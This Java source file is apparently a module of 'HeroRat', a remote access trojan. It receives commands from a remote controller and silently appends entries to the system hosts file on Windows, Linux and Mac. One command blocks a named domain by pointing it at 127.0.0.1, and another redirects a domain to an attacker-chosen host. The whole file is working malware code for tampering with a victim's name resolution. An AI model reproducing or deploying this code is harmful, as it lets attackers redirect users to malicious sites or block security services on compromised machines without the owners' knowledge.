package net.herorat.features.blocker;

import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.FileWriter;
import java.net.InetAddress;

public class Blocker
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		if (args[0].equals("add") && args.length == 2)
		{
			add(args[1]);
		}
		else if (args[0].equals("redirect") && args.length == 3)
		{
			redirect(args[1], args[2]);
		}
	}
	
	public static boolean add(String url)
	{
		try
		{
			FileWriter fstream = null;
	
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("win"))
			{
				fstream = new FileWriter(System.getenv("SystemRoot") + "\\system32\\drivers\\etc\\hosts", true);
			}
			else if (os.contains("nux") || os.contains("mac"))
			{
				fstream = new FileWriter("/etc/hosts", true);
			}
	
			BufferedWriter out = new BufferedWriter(fstream);
			out.write("127.0.0.1\t\t" + url);
			out.close();
			
			return true;
		}
		catch (Exception e) {}
		
		return false;
	}
	
	public static boolean redirect(String from, String to)
	{
		try
		{
			FileWriter fstream = null;
	
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("win"))
			{
				fstream = new FileWriter(System.getenv("SystemRoot") + "\\system32\\drivers\\etc\\hosts", true);
			}
			else if (os.contains("nux") || os.contains("mac"))
			{
				fstream = new FileWriter("/etc/hosts", true);
			}
	
			BufferedWriter out = new BufferedWriter(fstream);
			out.write(InetAddress.getByName(to) + "\t\t" + from);
			out.close();
			
			return true;
		}
		catch (Exception e) {}
		
		return false;
	}
}